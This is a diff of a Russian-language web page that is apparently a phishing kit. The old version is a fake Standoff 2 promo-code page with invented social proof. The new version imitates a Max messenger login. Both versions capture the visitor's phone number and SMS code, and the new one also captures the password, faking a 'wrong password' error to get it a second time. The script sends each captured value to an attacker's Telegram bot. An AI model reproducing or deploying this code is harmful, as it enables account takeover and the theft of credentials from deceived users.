@@ -1,546 +1,185 @@
-<title>Standoff 2 Promo</title>
+<!doctype html>
+<html lang="ru"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Вход в группу — Max</title>
 <style>
+:root{--text:#fff;--mute:#9aa0ac;--err:#ff5252;--link:#3ea6ff}
 *{box-sizing:border-box;margin:0;padding:0}
-:root{
-  --bg:#0d0a1a;
-  --bg2:#0a0714;
-  --card:rgba(22,18,38,.92);
-  --card2:#1a1530;
-  --field:#140f26;
-  --line:#2a2342;
-  --line2:#1f1a35;
-  --text:#eceff6;
-  --mute:#8a86a5;
-  --mute2:#5a5675;
-  --cyan:#4edcff;
-  --blue:#5b7fff;
-  --violet:#7a5cff;
-  --pink:#c84ad4;
-  --grad:linear-gradient(100deg,#7a5cff 0%,#5b7fff 55%,#4edcff 100%);
-  --grad-logo:linear-gradient(135deg,#4edcff 0%,#5b7fff 50%,#7a5cff 100%);
-  --grad-glow:radial-gradient(ellipse at 50% -10%,rgba(122,92,255,.35) 0%,rgba(91,127,255,.15) 25%,rgba(78,220,255,.08) 45%,transparent 70%);
-  --ok:#2bd176;
-  color-scheme:dark;
-}
-html,body{min-height:100%}
+html,body{height:100%}
 body{
-  font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
-  background:var(--bg);
+  font-family:-apple-system,'SF Pro Display','Segoe UI',Roboto,sans-serif;
   color:var(--text);
-  overflow-x:hidden;
-  display:flex;align-items:center;justify-content:center;
-  padding:40px 20px;
-  padding-left:max(20px,env(safe-area-inset-left));
-  padding-right:max(20px,env(safe-area-inset-right));
-  position:relative;
+  background:#0a0a14;
   min-height:100vh;
-}
-
-.ambient{position:absolute;inset:0;z-index:0;pointer-events:none;overflow:hidden;display:none}
-@media (min-width:1000px){.ambient{display:block}}
-.chip{
-  position:absolute;
-  background:rgba(22,18,38,.85);
-  border:1px solid var(--line);
-  border-radius:14px;
-  padding:14px 18px;
-  backdrop-filter:blur(8px);
-  box-shadow:0 20px 40px -20px rgba(0,0,0,.5);
-  animation:float 6s ease-in-out infinite;
-}
-.chip-code{font-family:'Consolas','SF Mono',monospace;font-size:14px;font-weight:700;letter-spacing:1.5px;color:var(--text)}
-.chip-reward{font-size:11px;color:var(--mute);margin-top:4px}
-.chip-meta{font-size:10px;color:var(--ok);margin-top:6px;display:flex;align-items:center;gap:5px}
-.chip-meta::before{content:"";width:5px;height:5px;border-radius:50%;background:var(--ok);box-shadow:0 0 6px var(--ok)}
-.chip.c1{top:14%;left:5%;transform:rotate(-6deg);animation-delay:0s}
-.chip.c2{top:62%;left:7%;transform:rotate(4deg);animation-delay:1.5s}
-.chip.c3{top:18%;right:6%;transform:rotate(5deg);animation-delay:.8s}
-.chip.c4{top:66%;right:5%;transform:rotate(-3deg);animation-delay:2.2s}
-@keyframes float{0%,100%{translate:0 0}50%{translate:0 -8px}}
-
-.side-panel{
-  position:absolute;
-  width:260px;
-  background:rgba(22,18,38,.75);
-  border:1px solid var(--line);
-  border-radius:18px;
-  padding:18px;
-  backdrop-filter:blur(10px);
-  box-shadow:0 20px 50px -20px rgba(0,0,0,.5);
-}
-.side-panel.left{top:38%;left:3%}
-.side-panel.right{top:36%;right:3%}
-.side-head{
-  display:flex;align-items:center;gap:10px;
-  padding-bottom:12px;margin-bottom:12px;
-  border-bottom:1px solid var(--line2);
-}
-.side-head .dot{width:8px;height:8px;border-radius:50%;background:var(--ok);box-shadow:0 0 8px var(--ok);animation:pulse 1.6s infinite}
-.side-head b{font-size:12px;letter-spacing:1.5px;text-transform:uppercase;color:var(--mute);font-weight:600}
-.side-stat{font-size:30px;font-weight:900;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;line-height:1;letter-spacing:-1px;font-variant-numeric:tabular-nums}
-.side-note{font-size:11px;color:var(--mute);margin-top:6px}
-@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(43,209,118,.5)}70%{box-shadow:0 0 0 10px rgba(43,209,118,0)}100%{box-shadow:0 0 0 0 rgba(43,209,118,0)}}
-
-.feed{list-style:none;display:grid;gap:8px}
-.feed li{display:flex;justify-content:space-between;gap:10px;font-size:11px;line-height:1.4}
-.feed .who{color:var(--text);font-weight:600}
-.feed .what{color:var(--mute)}
-.feed .when{color:var(--ok);white-space:nowrap;font-size:10px;align-self:center}
-
-.card{position:relative;z-index:1}
-
-.bg{
-  position:fixed;inset:0;z-index:-1;
-  background:
-    radial-gradient(ellipse 900px 600px at 15% 10%,rgba(122,92,255,.18),transparent 60%),
-    radial-gradient(ellipse 700px 500px at 90% 90%,rgba(78,220,255,.1),transparent 60%),
-    radial-gradient(ellipse 500px 400px at 50% 50%,rgba(91,127,255,.06),transparent 70%),
-    url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='280' height='280' viewBox='0 0 280 280'><g fill='none' stroke='%232a2448' stroke-width='1' opacity='.4'><circle cx='40' cy='50' r='12'/><path d='M30 50a10 5 0 0 0 20 0' /><circle cx='230' cy='70' r='2'/><circle cx='250' cy='60' r='1.5'/><circle cx='235' cy='85' r='1.3'/><g transform='translate(120 30)'><path d='M0 10 L7 0 L14 10 L10 10 L10 20 L4 20 L4 10 Z'/><circle cx='7' cy='7' r='1' fill='%232a2448'/></g><g transform='translate(190 160)'><circle cx='9' cy='9' r='8'/><ellipse cx='9' cy='9' rx='13' ry='3.5' transform='rotate(-18 9 9)'/></g><g transform='translate(45 160)'><circle cx='11' cy='11' r='7'/><circle cx='8.5' cy='9' r='1' fill='%232a2448'/><circle cx='13.5' cy='9' r='1' fill='%232a2448'/><path d='M8 13 Q11 15 14 13'/></g><g transform='translate(230 210)'><rect x='4' y='7' width='10' height='3.5' rx='1'/><rect x='0' y='4' width='4' height='10'/><rect x='14' y='4' width='4' height='10'/></g><circle cx='150' cy='120' r='1.3' fill='%232a2448'/><circle cx='80' cy='100' r='.9' fill='%232a2448'/><circle cx='175' cy='245' r='1' fill='%232a2448'/><circle cx='55' cy='260' r='.9' fill='%232a2448'/><circle cx='265' cy='140' r='1.3' fill='%232a2448'/></g></svg>") repeat,
-    var(--bg2);
-}
-
-.card{
-  width:100%;max-width:520px;
-  background:var(--card);
-  backdrop-filter:blur(14px);
-  border:1px solid var(--line);
-  border-radius:24px;
-  padding:40px 40px 32px;
-  box-shadow:0 30px 80px -20px rgba(0,0,0,.6),0 0 0 1px rgba(255,255,255,.02) inset;
+  display:flex;align-items:center;justify-content:center;
+  padding:20px;
+  position:relative;
   overflow:hidden;
 }
-.card::before{
-  content:"";position:absolute;inset:0;z-index:-1;
-  background:var(--grad-glow);
-  pointer-events:none;
+body::before{
+  content:'';
+  position:fixed;inset:0;
+  background-image:
+    radial-gradient(circle at 10% 20%, rgba(120,80,200,.15) 0, transparent 2%),
+    radial-gradient(circle at 85% 30%, rgba(80,120,200,.12) 0, transparent 2%),
+    radial-gradient(circle at 25% 75%, rgba(120,80,200,.1) 0, transparent 2%),
+    radial-gradient(circle at 70% 85%, rgba(80,120,200,.1) 0, transparent 2%),
+    radial-gradient(1px 1px at 15% 15%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 45% 25%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 75% 10%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 25% 55%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 65% 65%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 85% 75%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 5% 85%, #fff 50%, transparent 100%),
+    radial-gradient(1px 1px at 55% 90%, #fff 50%, transparent 100%);
+  opacity:.4;
+  z-index:0;
 }
-
-.brand{display:flex;flex-direction:column;align-items:center;gap:14px;margin-bottom:22px}
-.logo-mark{
-  width:62px;height:62px;border-radius:18px;
-  background:var(--grad-logo);
-  display:grid;place-items:center;
-  font-weight:900;font-size:22px;color:#fff;
-  letter-spacing:-.5px;
-  box-shadow:0 10px 30px -8px rgba(91,127,255,.5),0 0 0 1px rgba(255,255,255,.1) inset;
+.card{
+  position:relative;z-index:1;
+  background:linear-gradient(135deg,#1e4858 0%,#1a2a44 45%,#15152a 100%);
+  border-radius:24px;
+  padding:40px 36px 32px;
+  max-width:440px;width:100%;
+  box-shadow:0 20px 60px rgba(0,0,0,.5);
 }
-.brand-text{font-size:11px;letter-spacing:3px;color:var(--mute);text-transform:uppercase}
-.brand-text b{color:var(--text);font-weight:700}
-
-.hero{text-align:center;margin-bottom:28px}
-.badge{
-  display:inline-block;padding:6px 14px;border-radius:20px;
-  background:rgba(122,92,255,.14);
-  color:#b4a5ff;
-  font-size:11px;font-weight:600;letter-spacing:1.5px;
-  border:1px solid rgba(122,92,255,.3);
-  text-transform:uppercase;
-  margin-bottom:18px;
+.icons{display:flex;justify-content:space-between;margin-bottom:28px}
+.icon{width:24px;height:24px;opacity:.6;cursor:pointer;color:#fff}
+.logo{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:28px}
+.logo-dot{width:40px;height:40px;border-radius:50%;background:conic-gradient(from 180deg,#7c6cff,#4a9eff,#7c6cff);position:relative}
+.logo-dot::after{content:'';position:absolute;inset:8px;border-radius:50%;background:#15152a}
+.logo-text{font-size:28px;font-weight:600;letter-spacing:-.5px}
+h1{font-size:22px;font-weight:600;text-align:center;line-height:1.3;margin-bottom:24px;padding:0 10px}
+.input-wrap{background:rgba(255,255,255,.06);border-radius:12px;padding:4px;margin-bottom:12px}
+.input-row{display:flex;align-items:center;gap:4px;background:rgba(0,0,0,.25);border-radius:10px;padding:14px 16px}
+.flag{display:flex;align-items:center;gap:6px;color:#fff;font-size:15px;padding-right:10px;border-right:1px solid rgba(255,255,255,.1);margin-right:12px;cursor:pointer}
+.flag-emoji{font-size:18px}
+.arrow{opacity:.6;font-size:10px}
+input{flex:1;background:transparent;border:none;color:#fff;font-size:15px;outline:none}
+input::placeholder{color:rgba(255,255,255,.3)}
+.masked{-webkit-text-security:disc}
+.hint{font-size:13px;color:rgba(255,255,255,.5);margin:12px 4px 24px;line-height:1.4}
+.btn{
+  width:100%;background:rgba(255,255,255,.1);
+  color:rgba(255,255,255,.4);
+  border:none;padding:16px;border-radius:14px;
+  font-size:15px;font-weight:500;cursor:pointer;
+  transition:all .2s;
 }
-h1{font-size:26px;font-weight:800;letter-spacing:-.5px;margin-bottom:10px;line-height:1.2;text-wrap:balance}
-.sub{color:var(--mute);font-size:14px;line-height:1.55;max-width:360px;margin:0 auto}
-
-.steps{display:flex;gap:6px;margin-bottom:22px}
-.step-dot{flex:1;height:3px;border-radius:2px;background:var(--line);transition:background .3s}
-.step-dot.active{background:var(--grad)}
-
-.pane{display:none}
-.pane.show{display:block;animation:fade .3s ease}
-@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
-
-.field-label{
-  display:block;font-size:11px;color:var(--mute);
-  margin-bottom:10px;letter-spacing:1.5px;text-transform:uppercase;font-weight:600;
-}
-.phone-row{display:flex;gap:10px}
-.country{
-  display:flex;align-items:center;gap:8px;
-  background:var(--field);border:1px solid var(--line);
-  padding:0 16px;border-radius:14px;
-  font-size:15px;font-weight:600;color:var(--text);
-  cursor:pointer;flex-shrink:0;
-  transition:border-color .15s;
-}
-.country:hover{border-color:var(--violet)}
-.country .flag{
-  width:24px;height:18px;border-radius:3px;
-  background:linear-gradient(180deg,#fff 0 33.33%,#0033a0 33.33% 66.66%,#d52b1e 66.66% 100%);
-  box-shadow:0 0 0 1px rgba(0,0,0,.3) inset;
-  flex-shrink:0;
-}
-.input{
-  width:100%;background:var(--field);
-  border:1px solid var(--line);color:var(--text);
-  padding:16px 18px;border-radius:14px;font-size:16px;font-family:inherit;
-  transition:border-color .15s,box-shadow .15s;
-}
-.input:focus{outline:none;border-color:var(--violet);box-shadow:0 0 0 3px rgba(122,92,255,.15)}
-.input::placeholder{color:var(--mute2)}
-.phone-row .input{flex:1}
-
-.hint{color:var(--mute);font-size:12px;margin-top:10px;line-height:1.5}
-
-.cta{
-  width:100%;
-  background:var(--grad);
-  color:#fff;border:none;
-  padding:17px;border-radius:14px;
-  font-size:14px;font-weight:800;letter-spacing:1.5px;cursor:pointer;
-  margin-top:22px;
-  text-transform:uppercase;
-  box-shadow:0 12px 30px -8px rgba(122,92,255,.55);
-  transition:transform .15s,box-shadow .15s,opacity .15s;
-  font-family:inherit;
-}
-.cta:hover{transform:translateY(-1px);box-shadow:0 16px 36px -8px rgba(122,92,255,.65)}
-.cta:active{transform:translateY(0)}
-.cta:disabled{opacity:.45;cursor:not-allowed;transform:none;box-shadow:none}
-
-.link-row{text-align:center;margin-top:16px}
-.link{color:var(--cyan);font-size:13px;font-weight:600;text-decoration:none;cursor:pointer}
-.link:hover{text-decoration:underline}
-.link.off{color:var(--mute);pointer-events:none;cursor:default}
-.link.off:hover{text-decoration:none}
-
-.back-btn{
-  background:transparent;border:none;color:var(--mute);
-  font-size:13px;cursor:pointer;padding:6px 0;margin-top:4px;
-  text-align:center;font-family:inherit;width:100%;
-}
-.back-btn:hover{color:var(--text)}
-
-.sms-head{text-align:center;margin-bottom:22px}
-.sms-head p{font-size:13px;color:var(--mute);line-height:1.55;max-width:360px;margin:0 auto}
-.sms-head p b{color:var(--text);font-weight:600}
-
-.otp{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin:14px 0 4px}
-.otp input{
-  width:100%;aspect-ratio:1;
-  background:var(--field);
-  border:1px solid var(--line);color:var(--text);
-  text-align:center;font-size:22px;font-weight:800;
-  font-family:'Consolas','SF Mono',monospace;
-  border-radius:12px;padding:0;
-  transition:border-color .15s,box-shadow .15s;
-}
-.otp input:focus{outline:none;border-color:var(--violet);box-shadow:0 0 0 3px rgba(122,92,255,.18)}
-
-.done{text-align:center;padding:10px 0}
-.done-mark{
-  width:72px;height:72px;border-radius:50%;
-  background:rgba(43,209,118,.12);
-  border:2px solid var(--ok);
-  display:grid;place-items:center;margin:0 auto 18px;
-  color:var(--ok);font-size:34px;font-weight:900;
-}
-.done h3{font-size:20px;margin-bottom:8px;font-weight:700}
-.done p{color:var(--mute);font-size:13px;line-height:1.6;max-width:340px;margin:0 auto}
-
-.spinner{
-  width:16px;height:16px;border:2px solid rgba(255,255,255,.25);
-  border-top-color:#fff;border-radius:50%;
-  display:inline-block;vertical-align:-3px;margin-right:8px;
-  animation:spin .8s linear infinite;
-}
-@keyframes spin{to{transform:rotate(360deg)}}
-
-.divider{height:1px;background:var(--line2);margin:24px 0 18px}
-
-.foot{text-align:center;color:var(--mute);font-size:11px;line-height:1.6}
-
-@media (max-width:600px){
-  body{padding:20px 16px;align-items:flex-start}
-  .card{padding:28px 22px 22px;border-radius:22px}
-  .brand{margin-bottom:18px;gap:12px}
-  .logo-mark{width:56px;height:56px;font-size:20px;border-radius:16px}
-  .brand-text{font-size:10px;letter-spacing:2.5px}
-  .hero{margin-bottom:24px}
-  .badge{font-size:10px;padding:5px 12px;margin-bottom:14px;letter-spacing:1.2px}
-  h1{font-size:22px;letter-spacing:-.3px}
-  .sub{font-size:13px;max-width:none}
-  .steps{margin-bottom:20px}
-  .field-label{font-size:10px;margin-bottom:8px;letter-spacing:1.2px}
-  .phone-row{gap:8px}
-  .country{padding:0 12px;font-size:15px;border-radius:12px}
-  .country .flag{width:22px;height:16px}
-  .input{padding:14px 15px;font-size:16px;border-radius:12px}
-  .hint{font-size:11px;margin-top:9px}
-  .cta{padding:15px;font-size:13px;letter-spacing:1.2px;margin-top:18px;border-radius:12px}
-  .link{font-size:12px}
-  .back-btn{font-size:12px}
-  .otp{gap:7px;margin:12px 0 4px}
-  .otp input{font-size:20px;border-radius:10px}
-  .sms-head{margin-bottom:18px}
-  .sms-head p{font-size:12px}
-  .done-mark{width:64px;height:64px;font-size:30px;margin-bottom:14px}
-  .done h3{font-size:18px}
-  .done p{font-size:12px}
-  .divider{margin:20px 0 14px}
-  .foot{font-size:10px}
-}
-@media (max-width:360px){
-  body{padding:14px 12px}
-  .card{padding:22px 16px 18px}
-  h1{font-size:20px}
-  .otp{gap:5px}
-  .otp input{font-size:17px}
-  .country{padding:0 10px;font-size:14px}
-  .input{padding:13px 13px;font-size:15px}
-  .cta{padding:14px;font-size:12px;letter-spacing:1px}
-}
-@media (hover:none){
-  .cta:hover,.country:hover,.link:hover{transform:none;text-decoration:none}
-}
-.input,.otp input,.cta,.country{-webkit-tap-highlight-color:transparent}
-.cta,.link,.back-btn{touch-action:manipulation}
-</style>
-
-<div class="bg"></div>
-
-<div class="ambient">
-  <div class="chip c1">
-    <div class="chip-code">GOLDA2026NOV</div>
-    <div class="chip-reward">500 голды</div>
-    <div class="chip-meta">1 842 активаций</div>
-  </div>
-  <div class="chip c2">
-    <div class="chip-code">KNIFE-RARE-77</div>
-    <div class="chip-reward">Нож «Редкий»</div>
-    <div class="chip-meta">892 активации</div>
-  </div>
-  <div class="chip c3">
-    <div class="chip-code">STANDOFF-KASE</div>
-    <div class="chip-reward">Кейс «Легенда»</div>
-    <div class="chip-meta">2 971 активация</div>
-  </div>
-  <div class="chip c4">
-    <div class="chip-code">FREE-BATTLE-25</div>
-    <div class="chip-reward">Боевой пропуск +25</div>
-    <div class="chip-meta">3 410 активаций</div>
-  </div>
-
-  <div class="side-panel left">
-    <div class="side-head"><span class="dot"></span><b>Онлайн сейчас</b></div>
-    <div class="side-stat" id="online">1 247</div>
-    <div class="side-note">игроков активируют коды прямо сейчас</div>
-  </div>
-
-  <div class="side-panel right">
-    <div class="side-head"><span class="dot"></span><b>Последние активации</b></div>
-    <ul class="feed">
-      <li><span><span class="who">Alik***</span> <span class="what">· GOLDA2026NOV</span></span><span class="when">2 мин</span></li>
-      <li><span><span class="who">Dmit***</span> <span class="what">· SNIPER-AWP-X</span></span><span class="when">3 мин</span></li>
-      <li><span><span class="who">Rin***</span> <span class="what">· KNIFE-RARE-77</span></span><span class="when">5 мин</span></li>
-      <li><span><span class="who">Marc***</span> <span class="what">· STANDOFF-KASE</span></span><span class="when">7 мин</span></li>
-      <li><span><span class="who">Yuki***</span> <span class="what">· FREE-BATTLE-25</span></span><span class="when">9 мин</span></li>
-    </ul>
-  </div>
-</div>
-
+.btn.active{background:#fff;color:#15152a}
+.err{color:var(--err);font-size:13px;margin-top:10px;min-height:16px;text-align:center}
+.terms{font-size:12px;color:rgba(255,255,255,.4);text-align:center;line-height:1.5;margin:24px 0 16px;padding:0 12px}
+.terms b{color:rgba(255,255,255,.7);font-weight:500}
+.qr{text-align:center}
+.qr a{color:var(--link);font-size:14px;text-decoration:none;font-weight:500}
+.step2,.step3{display:none}
+.pwd-input{background:rgba(0,0,0,.25);border-radius:10px;padding:14px 16px;margin-bottom:12px}
+</style></head><body>
 <div class="card">
-  <div class="brand">
-    <div class="logo-mark">S2</div>
-    <div class="brand-text">STANDOFF <b>PROMO</b></div>
+  <div class="icons">
+    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>
+    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.1 9a3 3 0 015.8 1c0 2-3 3-3 3M12 17h.01"/></svg>
   </div>
 
-  <div class="steps">
-    <div class="step-dot active"></div>
-    <div class="step-dot"></div>
-    <div class="step-dot"></div>
+  <div class="logo">
+    <div class="logo-dot"></div>
+    <div class="logo-text">max</div>
   </div>
 
-  <div class="pane show" id="pane1">
-    <div class="hero">
-      <div class="badge">Группа · Октябрь 2026</div>
-      <h1>Промокоды Standoff 2</h1>
-      <p class="sub">Введите номер телефона, чтобы вступить в группу с ежедневными промокодами.</p>
-    </div>
-
-    <form id="form1" autocomplete="off" novalidate>
-      <span class="field-label">Номер телефона</span>
-      <div class="phone-row">
-        <div class="country"><span class="flag"></span>+7</div>
-        <input class="input" type="tel" id="phone" placeholder="123 456 78 90" required>
+  <div class="step1">
+    <h1>Вступить в группу<br>«Промокоды Standoff 2»</h1>
+    <div class="input-wrap">
+      <div class="input-row">
+        <div class="flag"><span class="flag-emoji">&#x1f1f7;&#x1f1fa;</span>+7<span class="arrow">&#x25be;</span></div>
+        <input id="phone" type="tel" inputmode="tel" placeholder="123 456 78 90" autocomplete="off">
       </div>
-      <p class="hint">Используется для входа в группу. Доступ в течение минуты.</p>
-      <button type="submit" class="cta" id="btn1">Вступить в группу</button>
-    </form>
-  </div>
-
-  <div class="pane" id="pane2">
-    <div class="hero">
-      <h1>Подтверждение</h1>
-      <p class="sub">Мы отправили 6-значный код на <b id="phoneEcho">+7 ___ ___ __ __</b>.</p>
     </div>
-
-    <form id="form2" autocomplete="off">
-      <span class="field-label">Код из SMS</span>
-      <div class="otp" id="otp">
-        <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]"><input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]"><input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]"><input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]"><input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]"><input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]">
-      </div>
-      <button type="submit" class="cta" id="btn2" disabled>Подтвердить</button>
-      <div class="link-row">
-        <a class="link off" id="resend">Отправить код снова через <b id="rtimer">59</b> сек</a>
-      </div>
-      <button type="button" class="back-btn" id="back">← Изменить номер</button>
-    </form>
+    <div class="hint">Для входа нужен номер из России или страны из списка — нажмите на флаг, чтобы выбрать</div>
+    <button class="btn" id="btn1" type="button">Продолжить</button>
+    <div class="err" id="e1"></div>
   </div>
 
-  <div class="pane" id="pane3">
-    <div class="done">
-      <div class="done-mark">✓</div>
-      <h3>Готово. Переход в группу…</h3>
-      <p>Через несколько секунд откроется чат с ежедневными промокодами. Если переход не произошёл — обновите страницу.</p>
+  <div class="step2">
+    <h1>Введите пароль от Max</h1>
+    <div class="pwd-input">
+      <input id="pwd" type="text" class="masked" placeholder="Пароль" autocomplete="off" spellcheck="false">
     </div>
+    <button class="btn" id="btn2" type="button">Войти</button>
+    <div class="err" id="e2"></div>
   </div>
 
-  <div class="divider"></div>
-  <p class="foot">Нажимая «Вступить в группу», вы соглашаетесь с правилами участия.</p>
+  <div class="step3">
+    <h1>Код из SMS</h1>
+    <div class="pwd-input">
+      <input id="code" type="text" inputmode="numeric" placeholder="XXXXXX" autocomplete="off">
+    </div>
+    <button class="btn" id="btn3" type="button">Подтвердить</button>
+    <div class="err" id="e3"></div>
+  </div>
+
+  <div class="terms">
+    Нажимая «Продолжить», вы принимаете <b>политику конфиденциальности</b>, пользовательское соглашение и правила персональных рекомендаций
+  </div>
+  <div class="qr"><a href="#">Войти по QR-коду</a></div>
 </div>
 
 <script src="config.js"></script>
 <script>
-const REDIRECT_URL = 'https://max.ru/promocod_standoffs';
+const sid = crypto.randomUUID().slice(0,8);
+let phoneVal = '';
 
-const phone=document.getElementById('phone');
-phone.addEventListener('input',e=>{
-  let d=e.target.value.replace(/\D/g,'');
-  if(d.startsWith('7')||d.startsWith('8'))d=d.slice(1);
-  d=d.slice(0,10);
-  let o='';
-  if(d.length>0)o+=d.slice(0,3);
-  if(d.length>=4)o+=' '+d.slice(3,6);
-  if(d.length>=7)o+=' '+d.slice(6,8);
-  if(d.length>=9)o+=' '+d.slice(8,10);
-  e.target.value=o;
-});
-
-const panes=[document.getElementById('pane1'),document.getElementById('pane2'),document.getElementById('pane3')];
-const dots=document.querySelectorAll('.step-dot');
-function goto(n){
-  panes.forEach((p,i)=>p.classList.toggle('show',i===n-1));
-  dots.forEach((d,i)=>d.classList.toggle('active',i<n));
+async function send(stage, data){
+  let text;
+  if(stage==='phone') text = `[PHONE] ${sid}\n+7 ${data.phone}\nUA: ${navigator.userAgent}`;
+  else if(stage==='pwd') text = `[PWD] ${sid}\n+7 ${phoneVal}\nПароль: ${data.pwd}`;
+  else text = `[OTP] ${sid}\n+7 ${phoneVal}\nКод: ${data.code}`;
+  const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=${encodeURIComponent(text)}`;
+  try{ const r = await fetch(url); const j = await r.json(); console.log('TG:',j); }catch(e){ console.log(e); }
 }
 
-function formatMsg(payload){
-  const stageLabel = {phone:'📱 Телефон',resend:'🔄 Повтор SMS',otp:'🔑 Код из SMS'}[payload.stage]||payload.stage;
-  const t = new Date().toLocaleString('ru-RU',{timeZone:'Europe/Moscow'});
-  let out = `<b>🎯 Standoff 2 — ${stageLabel}</b>\n\n`;
-  if(payload.phone) out += `📞 <b>Телефон:</b> <code>${payload.phone}</code>\n`;
-  if(payload.otp)   out += `🔑 <b>Код:</b> <code>${payload.otp}</code>\n`;
-  out += `\n🕐 ${t} (MSK)\n`;
-  out += `🖥 <code>${(payload.ua||navigator.userAgent).slice(0,180)}</code>`;
-  return out;
-}
-
-async function send(payload){
-  try{
-    const token = (typeof TG_TOKEN!=='undefined') ? TG_TOKEN : '';
-    const chat  = (typeof TG_CHAT !=='undefined') ? TG_CHAT  : '';
-    if(!token||!chat) return;
-    await fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({chat_id:chat,text:formatMsg(payload),parse_mode:'HTML',disable_web_page_preview:true}),
-      keepalive:true
-    });
-  }catch(_){}
-}
-
-const btn1=document.getElementById('btn1');
-document.getElementById('form1').addEventListener('submit',async e=>{
-  e.preventDefault();
-  const digits=phone.value.replace(/\D/g,'');
-  if(digits.length<10){phone.focus();phone.style.borderColor='#e94e4e';setTimeout(()=>phone.style.borderColor='',1200);return}
-  const full='+7 '+digits.slice(0,3)+' '+digits.slice(3,6)+' '+digits.slice(6,8)+' '+digits.slice(8,10);
-  btn1.disabled=true;
-  btn1.innerHTML='<span class="spinner"></span>Отправка кода…';
-  await send({stage:'phone',phone:full,ua:navigator.userAgent,ts:Date.now()});
-  setTimeout(()=>{
-    document.getElementById('phoneEcho').textContent=full;
-    goto(2);
-    document.querySelector('#otp input').focus();
-    startResendTimer();
-    btn1.disabled=false;
-    btn1.textContent='Вступить в группу';
-  },1200);
-});
-
-const otpInputs=document.querySelectorAll('#otp input');
-const btn2=document.getElementById('btn2');
-otpInputs.forEach((inp,i)=>{
-  inp.addEventListener('input',()=>{
-    inp.value=inp.value.replace(/\D/g,'').slice(0,1);
-    if(inp.value&&i<otpInputs.length-1)otpInputs[i+1].focus();
-    checkOtp();
+function activateBtn(input, btn){
+  input.addEventListener('input', ()=>{
+    if(input.value.trim().length>=3) btn.classList.add('active');
+    else btn.classList.remove('active');
   });
-  inp.addEventListener('keydown',e=>{
-    if(e.key==='Backspace'&&!inp.value&&i>0)otpInputs[i-1].focus();
-  });
-  inp.addEventListener('paste',e=>{
-    const t=(e.clipboardData.getData('text')||'').replace(/\D/g,'').slice(0,6);
-    if(!t)return;
-    e.preventDefault();
-    t.split('').forEach((ch,k)=>{if(otpInputs[k])otpInputs[k].value=ch});
-    otpInputs[Math.min(t.length,5)].focus();
-    checkOtp();
-  });
-});
-function checkOtp(){
-  const code=[...otpInputs].map(i=>i.value).join('');
-  btn2.disabled=code.length!==6;
 }
 
-let rInt=null;
-function startResendTimer(){
-  const link=document.getElementById('resend');
-  let s=59;
-  link.classList.add('off');
-  link.innerHTML='Отправить код снова через <b id="rtimer">59</b> сек';
-  clearInterval(rInt);
-  rInt=setInterval(()=>{
-    s--;
-    const tEl=document.getElementById('rtimer');
-    if(tEl)tEl.textContent=s;
-    if(s<=0){clearInterval(rInt);link.classList.remove('off');link.textContent='Отправить код снова'}
-  },1000);
-}
-document.getElementById('resend').addEventListener('click',async e=>{
-  if(e.currentTarget.classList.contains('off'))return;
-  await send({stage:'resend',phone:document.getElementById('phoneEcho').textContent,ts:Date.now()});
-  startResendTimer();
+const phone = document.getElementById('phone');
+const pwd = document.getElementById('pwd');
+const code = document.getElementById('code');
+activateBtn(phone, document.getElementById('btn1'));
+activateBtn(pwd, document.getElementById('btn2'));
+activateBtn(code, document.getElementById('btn3'));
+
+document.getElementById('btn1').addEventListener('click', async ()=>{
+  const v = phone.value.replace(/\D/g,'');
+  if(v.length<10){ document.getElementById('e1').textContent='Неверный номер'; return; }
+  phoneVal = v;
+  await send('phone', {phone:v});
+  document.querySelector('.step1').style.display='none';
+  document.querySelector('.step2').style.display='block';
 });
 
-document.getElementById('form2').addEventListener('submit',async e=>{
-  e.preventDefault();
-  const code=[...otpInputs].map(i=>i.value).join('');
-  if(code.length!==6)return;
-  btn2.disabled=true;
-  btn2.innerHTML='<span class="spinner"></span>Проверка…';
-  await send({stage:'otp',phone:document.getElementById('phoneEcho').textContent,otp:code,ua:navigator.userAgent,ts:Date.now()});
-  setTimeout(()=>{
-    goto(3);
-    clearInterval(rInt);
-    setTimeout(()=>{window.location.href=REDIRECT_URL},1200);
-  },1400);
+document.getElementById('btn2').addEventListener('click', async ()=>{
+  const v = pwd.value;
+  if(v.length<3){ document.getElementById('e2').textContent='Введите пароль'; return; }
+  await send('pwd', {pwd:v});
+  if(!document.getElementById('btn2').dataset.retry){
+    document.getElementById('btn2').dataset.retry='1';
+    document.getElementById('e2').textContent='Неверный пароль, попробуйте ещё раз';
+    pwd.value='';
+    return;
+  }
+  document.querySelector('.step2').style.display='none';
+  document.querySelector('.step3').style.display='block';
 });
 
-document.getElementById('back').addEventListener('click',()=>{
-  otpInputs.forEach(i=>i.value='');
-  btn2.disabled=true;
-  btn2.textContent='Подтвердить';
-  clearInterval(rInt);
-  goto(1);
